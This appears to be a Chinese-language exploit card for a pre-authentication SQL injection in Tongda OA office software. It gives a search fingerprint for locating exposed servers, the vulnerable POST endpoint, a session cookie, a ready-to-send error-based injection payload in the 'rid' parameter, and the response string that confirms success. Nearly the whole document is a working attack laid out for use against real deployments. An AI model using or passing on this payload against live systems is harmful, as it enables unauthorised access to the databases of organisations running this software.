# 通达OArid前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="office Anywhere"`
- **请求**：`POST /general/document/index.php/recv/register/turn HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=1ef6b0ee413048f9f7b2d4b78cd00598`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
_SERVER=&rid=EXP(~(SELECT*FROM(SELECT md5(1) FROM INFORMATION_SCHEMA.tables where table_schema=0x74645F6F61 LIMIT 1,1)a))
```
- **预期**：200　|　c4ca4238a0b9238